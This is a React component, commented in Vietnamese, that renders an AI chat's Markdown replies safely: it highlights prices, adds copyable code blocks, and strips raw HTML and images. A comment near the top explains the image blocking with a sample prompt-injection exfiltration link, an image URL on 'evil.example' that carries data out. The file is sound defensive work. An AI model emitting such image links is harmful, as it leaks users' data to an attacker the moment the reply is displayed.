'use client';

import React, { memo, useCallback, useEffect, useRef, useState } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { Check, Copy } from 'lucide-react';

/**
 * Hiển thị câu trả lời Markdown của AI thành typography sạch sẽ.
 *
 * An toàn XSS: react-markdown dựng cây React (không dùng innerHTML), `skipHtml` bỏ toàn bộ
 * HTML thô trong câu trả lời, URL `javascript:` bị urlTransform mặc định vô hiệu hoá,
 * và thẻ ảnh bị chặn (ảnh Markdown từ AI là kênh rò dữ liệu kinh điển của prompt injection:
 * `![](https://evil.example/?q=<dữ liệu>)` tự tải ngay khi hiển thị, không cần người dùng bấm).
 */

/**
 * Giá tiền: "850.000 VNĐ", "1.200.000 – 1.500.000 VNĐ", "1,5 triệu", "2tr", "$129", "99 USD".
 * `(?!\p{L})` sau đơn vị để "1.000 điểm" hay "5 trong" không bị nhận nhầm.
 */
export const PRICE_PATTERN =
  /(\d{1,3}(?:[.,]\d{3})+(?:\s?(?:-|–|—|đến)\s?\d{1,3}(?:[.,]\d{3})+)?\s?(?:VNĐ|VND|vnđ|vnd|đồng|đ|₫)(?!\p{L})|\d+(?:[.,]\d+)?\s?(?:triệu|tr)(?:\s?(?:VNĐ|VND|đồng))?(?!\p{L})|\$\s?\d+(?:[.,]\d+)?|\d+(?:[.,]\d+)?\s?USD(?!\p{L}))/gu;

export const PriceTag: React.FC<{ children: React.ReactNode }> = ({ children }) => (
  <span
    data-price-tag=""
    className="mx-0.5 inline-flex items-center whitespace-nowrap rounded border border-amber-400/20 bg-amber-400/10 px-1.5 py-0.5 align-baseline font-mono text-xs text-amber-300"
  >
    {children}
  </span>
);

/** Tách các chuỗi giá tiền trong một đoạn text thành PriceTag */
export function splitPrices(text: string): React.ReactNode[] {
  const parts = text.split(PRICE_PATTERN);
  // split với 1 nhóm bắt: phần tử lẻ là giá tiền
  return parts
    .map((part, i) =>
      i % 2 === 1 ? <PriceTag key={`price-${i}`}>{part}</PriceTag> : part
    )
    .filter((part) => part !== '');
}

function highlightPrices(children: React.ReactNode): React.ReactNode {
  return React.Children.map(children, (child) =>
    typeof child === 'string' ? splitPrices(child) : child
  );
}

const isWholePrice = (children: React.ReactNode): boolean => {
  if (typeof children !== 'string') return false;
  const match = children.trim().match(PRICE_PATTERN);
  return match !== null && match.length === 1 && match[0] === children.trim();
};

/** Khung code kính mờ có nút sao chép */
const CodeBlock: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const preRef = useRef<HTMLPreElement>(null);
  const [copied, setCopied] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(
    () => () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    },
    []
  );

  const handleCopy = useCallback(async () => {
    const text = preRef.current?.textContent ?? '';
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      if (timerRef.current) clearTimeout(timerRef.current);
      timerRef.current = setTimeout(() => setCopied(false), 1500);
    } catch {
      // Trình duyệt chặn clipboard (không phải HTTPS / không có quyền) -> bỏ qua
    }
  }, []);

  return (
    <div className="group/code relative my-3 overflow-hidden rounded-xl border border-white/10 bg-black/30 backdrop-blur-md">
      <button
        type="button"
        onClick={() => void handleCopy()}
        aria-label={copied ? 'Đã sao chép' : 'Sao chép đoạn mã'}
        className="absolute right-2 top-2 flex items-center gap-1 rounded-md border border-white/10 bg-white/[0.06] px-1.5 py-1 text-[10px] text-zinc-400 opacity-70 transition-[opacity,color,background-color] hover:bg-white/10 hover:text-zinc-100 focus-visible:opacity-100 group-hover/code:opacity-100"
      >
        {copied ? <Check className="h-3 w-3 text-emerald-300" /> : <Copy className="h-3 w-3" />}
        <span>{copied ? 'Đã chép' : 'Chép'}</span>
      </button>
      <pre
        ref={preRef}
        className="scroll-thin overflow-x-auto p-3 pr-16 font-mono text-[12px] leading-relaxed text-zinc-200 [&_code]:border-0 [&_code]:bg-transparent [&_code]:p-0 [&_code]:text-inherit"
      >
        {children}
      </pre>
    </div>
  );
};

const components: Components = {
  p: ({ children }) => <p className="my-2 leading-relaxed first:mt-0 last:mb-0">{highlightPrices(children)}</p>,
  strong: ({ children }) =>
    isWholePrice(children) ? (
      <PriceTag>{children}</PriceTag>
    ) : (
      <strong className="font-semibold text-zinc-100">{highlightPrices(children)}</strong>
    ),
  em: ({ children }) => <em className="italic text-zinc-300">{highlightPrices(children)}</em>,
  h1: ({ children }) => (
    <h3 className="mb-2 mt-4 text-[15px] font-semibold tracking-tight text-zinc-50 first:mt-0">
      {highlightPrices(children)}
    </h3>
  ),
  h2: ({ children }) => (
    <h3 className="mb-2 mt-4 text-[14.5px] font-semibold tracking-tight text-zinc-50 first:mt-0">
      {highlightPrices(children)}
    </h3>
  ),
  h3: ({ children }) => (
    <h4 className="mb-1.5 mt-4 text-[13.5px] font-semibold text-zinc-100 first:mt-0">
      {highlightPrices(children)}
    </h4>
  ),
  h4: ({ children }) => (
    <h5 className="mb-1 mt-3 text-[12px] font-semibold uppercase tracking-wide text-zinc-400 first:mt-0">
      {highlightPrices(children)}
    </h5>
  ),
  ul: ({ children }) => (
    <ul className="my-2 space-y-1.5 [&>li]:relative [&>li]:pl-4 [&>li]:before:absolute [&>li]:before:left-0.5 [&>li]:before:top-[0.6em] [&>li]:before:h-1.5 [&>li]:before:w-1.5 [&>li]:before:rounded-full [&>li]:before:bg-zinc-500 [&>li]:before:content-['']">
      {children}
    </ul>
  ),
  ol: ({ children, start }) => (
    <ol
      start={start}
      className="my-2 list-decimal space-y-1.5 pl-5 marker:font-mono marker:text-[11px] marker:text-zinc-500"
    >
      {children}
    </ol>
  ),
  li: ({ children }) => <li className="leading-relaxed [&>p]:my-0">{highlightPrices(children)}</li>,
  a: ({ children, href }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer nofollow"
      className="text-sky-300 underline decoration-sky-300/40 underline-offset-2 hover:decoration-sky-300"
    >
      {children}
    </a>
  ),
  // Ảnh trong câu trả lời AI: chỉ hiện chữ mô tả, không tải URL (chặn rò dữ liệu qua ảnh)
  img: ({ alt }) => (alt ? <span className="text-zinc-400">[Ảnh: {alt}]</span> : null),
  blockquote: ({ children }) => (
    <blockquote className="my-2 border-l-2 border-zinc-600 pl-3 text-zinc-300">{children}</blockquote>
  ),
  hr: () => <hr className="my-3 border-white/10" />,
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  code: ({ children, className }) => (
    <code
      className={`rounded border border-white/10 bg-white/[0.06] px-1 py-0.5 font-mono text-[0.85em] text-zinc-100 ${className ?? ''}`}
    >
      {children}
    </code>
  ),
  table: ({ children }) => (
    <div className="scroll-thin my-3 overflow-x-auto rounded-lg border border-white/10">
      <table className="w-full border-collapse text-left text-[12px]">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-white/[0.04] text-zinc-300">{children}</thead>,
  th: ({ children }) => (
    <th className="border-b border-white/10 px-2.5 py-1.5 font-semibold">{highlightPrices(children)}</th>
  ),
  td: ({ children }) => (
    <td className="border-b border-white/5 px-2.5 py-1.5 align-top">{highlightPrices(children)}</td>
  ),
};

export interface MarkdownMessageProps {
  content: string;
  className?: string;
}

const MarkdownMessageBase: React.FC<MarkdownMessageProps> = ({ content, className }) => (
  <div className={`markdown-message break-words text-[13px] text-zinc-200 ${className ?? ''}`}>
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
      {content}
    </ReactMarkdown>
  </div>
);

/** memo: khi stream, chỉ tin nhắn đang nhận chữ mới phải parse lại */
export const MarkdownMessage = memo(MarkdownMessageBase);
MarkdownMessage.displayName = 'MarkdownMessage';
